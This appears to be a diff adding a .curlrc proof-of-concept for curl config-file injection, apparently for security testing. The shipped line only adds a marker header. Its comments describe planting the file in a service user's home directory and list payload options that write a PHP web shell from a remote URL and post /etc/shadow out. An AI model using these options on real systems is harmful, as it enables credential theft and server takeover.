@@ -1,0 +1,11 @@
+# Safe PoC -> x8bitranjit
+# curl config-file injection (same class as .wgetrc): if .curlrc lands in the
+# HOME of a service user that runs curl (CI jobs, cron, update scripts),
+# every curl run loads YOUR options. Plant via traversal-write / upload-to-home.
+#
+# BENIGN PROOF (shipped): marker header on every request - visible at any
+# header-echo endpoint or your listener.
+# REAL PAYLOAD SHAPES (authorized only):
+#   output = "/var/www/html/sh.php"   + remote url line -> file write
+#   --post-file = /etc/shadow         -> exfil
+header = "X-Safe-PoC: x8bitranjit"
